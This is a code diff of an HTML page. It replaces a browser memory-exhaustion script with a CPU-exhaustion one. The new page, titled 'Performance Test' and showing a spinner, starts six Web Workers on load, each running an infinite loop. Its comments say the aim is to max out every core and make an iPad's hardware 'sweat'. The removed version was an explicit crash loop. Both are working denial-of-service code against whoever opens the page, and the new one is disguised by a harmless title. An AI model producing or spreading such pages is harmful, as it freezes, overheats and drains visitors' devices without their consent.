@@ -2,24 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>RAM Test</title>
+    <title>Performance Test</title>
+    <style>
+        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 20%; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #09f; inline-size: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Allocating memory...</h1>
+    <h1>Running continuous compute tasks...</h1>
+    <div class="spinner"></div>
+
     <script>
-        // This array stays in memory, preventing garbage collection
-        const memoryHog = [];
-
-        function leak() {
-            // Endlessly push massive strings into the array
-            while (true) {
-                // Generates a massive string and forces it into the global array
-                memoryHog.push(new Array(10000000).join('X'));
+        // Web Workers allow us to run heavy code in the background without triggering an instant crash
+        const workerCode = `
+            function heavyCalculation() {
+                let x = 0;
+                while (true) {
+                    // Perform continuous, useless math operations to max out the CPU thread
+                    x += Math.sin(Math.random()) * Math.cos(Math.random());
+                }
             }
-        }
+            // Start multiple parallel calculation loops
+            heavyCalculation();
+        `;
 
-        // Trigger the crash loop immediately on load
-        window.onload = leak;
+        // Create a blob from the worker code string
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        // Spawn multiple workers to target multiple CPU cores simultaneously 
+        // iPad chips have multiple cores; spawning 4-6 will force the hardware to sweat
+        const coreCount = 6; 
+        for (let i = 0; i < coreCount; i++) {
+            new Worker(workerUrl);
+        }
     </script>
 </body>
 </html>
